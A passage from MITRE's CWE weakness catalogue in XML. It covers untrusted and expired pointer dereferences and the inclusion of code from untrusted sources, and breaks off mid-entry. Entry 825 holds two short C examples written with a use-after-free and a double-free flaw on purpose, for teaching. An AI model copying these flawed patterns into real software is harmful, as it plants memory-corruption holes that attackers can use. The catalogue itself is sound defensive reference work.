               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="822" Name="Untrusted Pointer Dereference" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The program obtains a value from an untrusted source, converts
					this value to a pointer, and dereferences the resulting pointer. </Description_Summary>
            <Extended_Description>
               <Text>An attacker can supply a pointer for memory locations that the program is
						not expecting. If the pointer is dereferenced for a write operation, the
						attack might allow modification of critical program state variables, cause a
						crash, or execute code. If the dereferencing operation is for a read, then
						the attack might allow reading of sensitive data, cause a crash, or set a
						program variable to an unexpected value (since the value will be read from
						an unexpected memory location).</Text>
               <Text>There are several variants of this weakness, including but not necessarily
						limited to:</Text>
               <Block Block_Nature="List">
                  <Text>The untrusted value is directly invoked as a function call.</Text>
                  <Text>In OS kernels or drivers where there is a boundary between "userland"
							and privileged memory spaces, an untrusted pointer might enter through
							an API or system call (see CWE-781 for one such example).</Text>
                  <Text>Inadvertently accepting the value from an untrusted control sphere
							when it did not have to be accepted as input at all. This might occur
							when the code was originally developed to be run by a single user in a
							non-networked environment, and the code is then ported to or otherwise
							exposed to a networked environment.</Text>
               </Block>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>119</Relationship_Target_ID>
               <!--Improper Restriction of Operations within the Bounds of a Memory Buffer--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>465</Relationship_Target_ID>
               <!--Pointer Issues--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>125</Relationship_Target_ID>
               <!--Out-of-bounds Read--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>787</Relationship_Target_ID>
               <!--Out-of-bounds Write--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>876</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
         </Relationships>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>There are close relationships between incorrect pointer dereferences and
						other weaknesses related to buffer operations. There may not be sufficient
						community agreement regarding these relationships. Further study is needed
						to determine when these relationships are chains, composites,
						perspective/layering, or other types of relationships. As of September 2010,
						most of the relationships are being captured as chains.</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Terminology_Notes>
            <Terminology_Note>
               <Text>Many weaknesses related to pointer dereferences fall under the general
						term of "memory corruption" or "memory safety." As of September 2010, there
						is no commonly-used terminology that covers the lower-level variants.</Text>
            </Terminology_Note>
         </Terminology_Notes>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the untrusted pointer is used in a read operation, an attacker
							might be able to read sensitive portions of memory.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the untrusted pointer references a memory location that is not
							accessible to the program, or points to a location that is "malformed"
							or larger than expected by a read or write operation, the application
							may terminate unexpectedly.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Modify memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the untrusted pointer is used in a function call, or points to
							unexpected data in a write operation, then code execution may be
							possible.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5655</Observed_Example_Reference>
               <Observed_Example_Description>message-passing framework interprets values in
						packets as pointers, causing a crash.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-2299</Observed_Example_Reference>
               <Observed_Example_Description>labeled as a "type confusion" issue, also referred
						to as a "stale pointer." However, the bug ID says "contents are simply
						interpreted as a pointer... renderer ordinarily doesn't supply this pointer
						directly". The "handle" in the untrusted area is replaced in one function,
						but not another - thus also, effectively, exposure to wrong sphere
						(CWE-668). </Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-1719</Observed_Example_Reference>
               <Observed_Example_Description>Untrusted dereference using undocumented
						constructor.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-1250</Observed_Example_Reference>
               <Observed_Example_Description>An error code is incorrectly checked and
						interpreted as a pointer, leading to a crash.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0311</Observed_Example_Reference>
               <Observed_Example_Description>An untrusted value is obtained from a packet and
						directly called as a function pointer, leading to code
						execution.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-1818</Observed_Example_Reference>
               <Observed_Example_Description>Undocumented attribute in multimedia software
						allows "unmarshaling" of an untrusted pointer.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-3189</Observed_Example_Reference>
               <Observed_Example_Description>ActiveX control for security software accepts a
						parameter that is assumed to be an initialized
						pointer.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-1253</Observed_Example_Reference>
               <Observed_Example_Description>Spreadsheet software treats certain record values
						that lead to "user-controlled pointer" (might be untrusted offset, not
						untrusted pointer).</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Research_Gaps>
            <Research_Gap>
               <Text>Under-studied and probably under-reported as of September 2010. This
						weakness has been reported in high-visibility software, but applied
						vulnerability researchers have only been investigating it since
						approximately 2008, and there are only a few public reports. Few reports
						identify weaknesses at such a low level, which makes it more difficult to
						find and study real-world code examples.</Text>
            </Research_Gap>
         </Research_Gaps>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Define and use a pointer validation
						function</Mapped_Node_Name>
               <Mapped_Node_ID>MEM10-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submitter_Organization>MITRE</Submitter_Organization>
               <Submission_Date>2010-09-22</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="825" Name="Expired Pointer Dereference" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The program dereferences a pointer that contains a location for
					memory that was previously valid, but is no longer valid.</Description_Summary>
            <Extended_Description>
               <Text>When a program releases memory, but it maintains a pointer to that memory,
						then the memory might be re-allocated at a later time. If the original
						pointer is accessed to read or write data, then this could cause the program
						to read or modify data that is in use by a different function or process.
						Depending on how the newly-allocated memory is used, this could lead to a
						denial of service, information exposure, or code execution.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>119</Relationship_Target_ID>
               <!--Improper Restriction of Operations within the Bounds of a Memory Buffer--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>672</Relationship_Target_ID>
               <!--Operation on a Resource after Expiration or Release--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>465</Relationship_Target_ID>
               <!--Pointer Issues--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>125</Relationship_Target_ID>
               <!--Out-of-bounds Read--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>787</Relationship_Target_ID>
               <!--Out-of-bounds Write--></Relationship>
         </Relationships>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>There are close relationships between incorrect pointer dereferences and
						other weaknesses related to buffer operations. There may not be sufficient
						community agreement regarding these relationships. Further study is needed
						to determine when these relationships are chains, composites,
						perspective/layering, or other types of relationships. As of September 2010,
						most of the relationships are being captured as chains.</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Dangling pointer</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Terminology_Notes>
            <Terminology_Note>
               <Text>Many weaknesses related to pointer dereferences fall under the general
						term of "memory corruption" or "memory safety." As of September 2010, there
						is no commonly-used terminology that covers the lower-level variants.</Text>
            </Terminology_Note>
         </Terminology_Notes>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the expired pointer is used in a read operation, an attacker might
							be able to control data read in by the application.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the expired pointer references a memory location that is not
							accessible to the program, or points to a location that is "malformed"
							(such as NULL) or larger than expected by a read or write operation,
							then a crash may occur.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the expired pointer is used in a function call, or points to
							unexpected data in a write operation, then code execution may be
							possible.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Choose a language that provides automatic memory management.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When freeing pointers, be sure to set them to NULL once they are
							freed. However, the utilization of multiple or complex data structures
							may lower the usefulness of this strategy.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-71">
               <Intro_Text>The following code shows a simple example of a use after free
						error:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>char* ptr = (char*)malloc (SIZE);</Code>
                     <Code>if (err) {</Code>
                     <Block>
                        <Code>abrt = 1;</Code>
                        <Code>free(ptr);</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>...</Code>
                     <Code>if (abrt) {</Code>
                     <Block>
                        <Code>logError("operation aborted before commit", ptr);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>When an error occurs, the pointer is immediately freed. However, this
							pointer is later incorrectly used in the logError function.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-72">
               <Intro_Text>The following code shows a simple example of a double free
						error:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>char* ptr = (char*)malloc (SIZE);</Code>
                     <Code>...</Code>
                     <Code>if (abrt) {</Code>
                     <Block>
                        <Code>free(ptr);</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>...</Code>
                     <Code>free(ptr);</Code>
                  </Block>
                  <Text>Double free vulnerabilities have two common (and sometimes
							overlapping) causes:</Text>
                  <Block Block_Nature="List">
                     <Text>Error conditions and other exceptional circumstances</Text>
                     <Text>Confusion over which part of the program is responsible for
								freeing the memory</Text>
                  </Block>
                  <Text>Although some double free vulnerabilities are not much more
							complicated than the previous example, most are spread out across
							hundreds of lines of code or even different files. Programmers seem
							particularly susceptible to freeing global variables more than
							once.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5013</Observed_Example_Reference>
               <Observed_Example_Description>access of expired memory address leads to
						arbitrary code execution</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-3257</Observed_Example_Reference>
               <Observed_Example_Description>stale pointer issue leads to denial of service and
						possibly other consequences</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-1211</Observed_Example_Reference>
               <Observed_Example_Description>read of value at an offset into a structure after
						the offset is no longer valid </Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Research_Gaps>
            <Research_Gap>
               <Text>Under-studied and probably under-reported as of September 2010. This
						weakness has been reported in high-visibility software, but applied
						vulnerability researchers have only been investigating it since
						approximately 2008, and there are only a few public reports. Few reports
						identify weaknesses at such a low level, which makes it more difficult to
						find and study real-world code examples.</Text>
            </Research_Gap>
         </Research_Gaps>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submitter_Organization>MITRE</Submitter_Organization>
               <Submission_Date>2010-09-22</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="829" Name="Inclusion of Functionality from Untrusted Control Sphere" Weakness_Abstraction="Class" Status="Incomplete">
         <Description>
            <Description_Summary>The software imports, requires, or includes executable
					functionality (such as a library) from a source that is outside of the intended
					control sphere. </Description_Summary>
            <Extended_Description>
               <Text>When including third-party functionality, such as a web widget, library,
						or other source of functionality, the software must effectively trust that
						functionality. Without sufficient protection mechanisms, the functionality
						could be malicious in nature (either by coming from an untrusted source,
						being spoofed, or being modified in transit from a trusted source). The
						functionality might also contain its own weaknesses, or grant access to
						additional functionality and state information that should be kept private
						to the base system, such as system state information, sensitive application
						data, or the DOM of a web application.</Text>
               <Text>This might lead to many different consequences depending on the included
						functionality, but some examples include injection of malware, information
						exposure by granting excessive privileges or permissions to the untrusted
						functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or
						open redirect to malware (CWE-601). </Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>864</Relationship_Target_ID>
               <!--2011 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>669</Relationship_Target_ID>
               <!--Incorrect Resource Transfer Between Spheres--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>813</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A4 - Insecure Direct Object References--></Relationship>
         </Relationships>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could insert malicious functionality into the program by
							causing the program to download code that the attacker has placed into
							the untrusted control sphere, such as a malicious web site.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Forced Path Execution</Text>
                        <Text>Monitored Virtual Environment - run potentially malicious code
									in sandbox / wrapper / virtual machine, see if it does anything
									suspicious</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Attack Modeling</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Enforcement by Conversion</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.</Text>
                  <Text>For example, ID 1 could map to "inbox.txt" and ID 2 could map to
							"profile.txt". Features such as the ESAPI AccessReferenceMap [R.829.1]
							provide this capability.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.829.2]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
                  <Text>When validating filenames, use stringent whitelists that limit the
							character set to be used. If feasible, only allow a single "." character
							in the filename to avoid weaknesses such as CWE-23, and exclude
							directory separators such as "/" to avoid CWE-36. Use a whitelist of
							allowable file extensions, which will help to avoid CWE-434.</Text>
                  <Text>Do not rely exclusively on a filtering mechanism that removes
							potentially dangerous characters. This is equivalent to a blacklist,
							which may be incomplete (CWE-184). For example, filtering "/" is
							insufficient protection if the filesystem also supports the use of "\"
							as a directory separator. Another possible error could occur when the
							filtering is applied in a way that still produces dangerous data
							(CWE-182). For example, if "../" sequences are removed from the
							".../...//" string in a sequential fashion, two instances of "../" would
							be removed from the original string, but the remaining characters would
							still form the "../" string.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
